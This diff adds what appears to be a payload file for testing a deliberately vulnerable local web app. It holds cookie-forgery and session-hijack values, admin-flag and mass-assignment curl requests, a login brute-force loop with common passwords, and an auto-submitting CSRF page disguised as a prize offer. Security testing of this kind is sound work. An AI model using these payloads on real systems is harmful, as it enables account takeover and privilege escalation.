@@ -1,0 +1,152 @@
+# Authentication Bypass Payloads for Security Test App
+# Target: Cookie manipulation, Session hijacking
+
+# ============================================
+# 1. Cookie Manipulation (쿠키 조작)
+# ============================================
+
+# remember_token cookie values to try
+# Current app stores user ID in remember_token
+
+# Admin user (ID: 1)
+remember_token=1
+
+# Other users
+remember_token=2
+remember_token=3
+
+# Negative/Zero values
+remember_token=0
+remember_token=-1
+
+# Large values
+remember_token=999999
+remember_token=2147483647
+
+# String values
+remember_token=admin
+remember_token=true
+remember_token=1;admin=true
+
+# Encoded values
+remember_token=MQ==  # Base64 of "1"
+
+# ============================================
+# 2. Session ID Manipulation
+# ============================================
+
+# Empty session
+_security_test_session=
+
+# Invalid session
+_security_test_session=invalid
+_security_test_session=aaaaaaaaaaaaaaaa
+
+# ============================================
+# 3. Direct URL Access (직접 URL 접근)
+# ============================================
+
+# Protected pages without authentication
+GET /users
+GET /users/1
+GET /admin
+GET /dashboard
+
+# ============================================
+# 4. Parameter Manipulation (파라미터 조작)
+# ============================================
+
+# User ID manipulation
+/users?id=1
+/users?user_id=1
+/users/1
+
+# Admin flag
+?admin=true
+?is_admin=1
+?role=admin
+
+# ============================================
+# 5. HTTP Header Manipulation
+# ============================================
+
+# X-Forwarded headers
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: admin.localhost
+X-Original-URL: /admin
+
+# Referer bypass
+Referer: http://localhost:3000/admin
+
+# ============================================
+# 6. Test Commands (curl)
+# ============================================
+
+# Cookie manipulation test
+curl -b "remember_token=1" http://localhost:3000/users
+curl -b "remember_token=2" http://localhost:3000/users
+
+# Direct access test
+curl http://localhost:3000/users
+
+# Session hijacking simulation
+curl -b "_security_test_session=stolen_session_id" http://localhost:3000/users
+
+# ============================================
+# 7. Mass Assignment for Admin
+# ============================================
+
+# Register as admin
+curl -X POST http://localhost:3000/users \
+  -d "user[email]=hacker@test.com" \
+  -d "user[name]=Hacker" \
+  -d "user[password]=hack123" \
+  -d "user[is_admin]=true"
+
+curl -X POST http://localhost:3000/users \
+  -d "user[email]=hacker2@test.com" \
+  -d "user[name]=Hacker2" \
+  -d "user[password]=hack123" \
+  -d "user[is_admin]=1"
+
+curl -X POST http://localhost:3000/users \
+  -d "user[email]=hacker3@test.com" \
+  -d "user[name]=Hacker3" \
+  -d "user[password]=hack123" \
+  -d "user[admin]=true"
+
+# ============================================
+# 8. Brute Force Test (무차별 대입)
+# ============================================
+
+# Login brute force
+for i in {1..20}; do
+  curl -s -X POST http://localhost:3000/login \
+    -d "email=admin@test.com&password=password$i"
+done
+
+# Common passwords
+admin123
+password
+123456
+admin
+root
+test123
+
+# ============================================
+# 9. CSRF Attack HTML
+# ============================================
+
+<!-- Save as attack.html and open in browser while logged in -->
+<html>
+<body>
+<h1>Click the button for a prize!</h1>
+<form action="http://localhost:3000/users" method="POST" id="csrf">
+  <input type="hidden" name="user[email]" value="csrf@attacker.com">
+  <input type="hidden" name="user[name]" value="CSRF Attack">
+  <input type="hidden" name="user[password]" value="hacked123">
+  <input type="hidden" name="user[is_admin]" value="true">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
